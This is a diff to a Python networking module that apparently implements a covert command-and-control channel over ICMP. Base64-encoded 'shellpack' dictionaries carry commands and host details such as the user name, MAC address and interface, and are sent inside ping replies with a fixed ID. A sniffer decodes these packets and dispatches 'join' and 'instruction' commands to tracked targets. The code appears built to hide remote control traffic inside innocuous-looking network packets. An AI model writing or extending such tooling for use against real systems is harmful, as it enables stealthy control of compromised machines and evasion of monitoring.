@@ -3,6 +3,7 @@ import os
 import socket
 import psutil
 import pwd
+import ast
 import base64
 
 TTL = int(64)
@@ -24,6 +25,55 @@ class Host:
 
         return report
 
+    def sniff_callback(self, packet):
+        # Parses out things that shouldn't be there
+
+        if packet[ICMP].type != 0:
+            return
+        elif packet[IP].src == self.ip:
+            return
+        elif packet[ICMP].id != ICMP_ID:
+            return
+        elif not packet[Raw].load:
+            return
+
+        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
+        shellpack = base64.b64decode(encoded_shellpack).decode()
+        unpacked = ast.literal_eval(shellpack)
+        
+        print(f" $ {unpacked['command']} received from {unpacked['ip']} > {unpacked['message']}")
+
+        match unpacked['command']:
+            case "join":
+                self.join(unpacked)
+            case "instruction":
+                self.instruction(unpacked)
+            case _:
+                print("Default case")
+
+    def build_shellpack(self, command: str, message: str | None = None, data: str | None = None) -> dict:
+        shellpack = {
+            "command": command,
+            "message": message,
+            "data" : data,
+            "ip": self.ip,
+            "mac": self.mac,
+            "iface": self.iface,
+            "user": self.user,
+            "heartbeat": self.heartbeat
+            }
+
+        shellpack = str(shellpack).encode('utf-8')
+        shellpack = base64.b64encode(shellpack)
+        return shellpack
+
+    def send(self, ip, command: str, message: str | None = None, data: str | None = None) -> bool:
+        shellpack = self.build_shellpack(command, message, data)
+        data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+        sr(data, timeout=0, verbose=0)
+        
+        return True
+
 class Target(Host):
     def __init__(self, shellpack):
         self.ip = shellpack['ip']
@@ -37,12 +87,6 @@ class Target(Host):
     def update_status(self, status):
         self.status = status
         print(f" - Status of target {self.ip} has been updated to {status}")
-
-def send(ip, shellpack: str) -> bool:
-        data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
-        sr(data, timeout=0, verbose=0)
-        
-        return True
 
 def get_iface(ip) -> str:
     nics = psutil.net_if_addrs()
@@ -64,19 +108,3 @@ def get_mac(iface) -> str:
     nics = psutil.net_if_addrs()
     mac = ([j.address for i in nics for j in nics[i] if i==iface and j.family==psutil.AF_LINK])[0]
     return mac.replace('-',':')
-
-def build_shellpack(host, command: str, message: str | None = None, data: str | None = None) -> dict:
-    shellpack = {
-        "command": command,
-        "message": message,
-        "data" : data,
-        "ip": host.ip,
-        "mac": host.mac,
-        "iface": host.iface,
-        "user": host.user,
-        "heartbeat": host.heartbeat
-        }
-
-    shellpack = str(shellpack).encode('utf-8')
-    shellpack = base64.b64encode(shellpack)
-    return shellpack
